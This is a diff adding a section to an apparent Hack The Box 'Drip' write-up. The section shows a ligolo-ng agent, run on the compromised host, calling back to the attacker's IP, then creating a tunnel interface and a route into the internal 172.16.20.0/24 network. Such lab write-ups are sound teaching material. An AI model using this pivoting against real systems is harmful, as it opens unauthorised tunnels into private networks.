@@ -523,7 +523,48 @@ scp agent ebelford@drip.htb:/tmp/
 This transferred it to the target
 
 ```python
-
+ebelford@drip:/tmp$ chmod +x agent
+ebelford@drip:/tmp$ ./agent -connect 10.10.14.61:11601 --ignore-cert
+WARN[0000] warning, certificate validation disabled     
+INFO[0000] Connection established                        addr="10.10.14.61:11601"
 ```
+
+Ill then send the connection back
+
+```python
+ligolo-ng » session
+? Specify a session : 1 - ebelford@drip - 10.129.232.7:58262 - 00155d840302
+[Agent : ebelford@drip] » 
+[Agent : ebelford@drip] » 
+[Agent : ebelford@drip] » ifcreate --name ligolo
+INFO[0115] Creating a new ligolo interface...           
+INFO[0115] Interface created!                           
+[Agent : ebelford@drip] » ifconfig
+┌────────────────────────────────────┐
+│ Interface 0                        │
+├──────────────┬─────────────────────┤
+│ Name         │ lo                  │
+│ Hardware MAC │                     │
+│ MTU          │ 65536               │
+│ Flags        │ up|loopback|running │
+│ IPv4 Address │ 127.0.0.1/8         │
+└──────────────┴─────────────────────┘
+┌───────────────────────────────────────────────┐
+│ Interface 1                                   │
+├──────────────┬────────────────────────────────┤
+│ Name         │ eth0                           │
+│ Hardware MAC │ 00:15:5d:84:03:02              │
+│ MTU          │ 1500                           │
+│ Flags        │ up|broadcast|multicast|running │
+│ IPv4 Address │ 172.16.20.3/24                 │
+└──────────────┴────────────────────────────────┘
+[Agent : ebelford@drip] » route_add --name ligolo --route 172.16.20.0/24
+INFO[0194] Route created.                               
+[Agent : ebelford@drip] » tunnel_start 
+INFO[0205] Starting tunnel to ebelford@drip (00155d840302) 
+[Agent : ebelford@drip] »  
+```
+
+
 
 
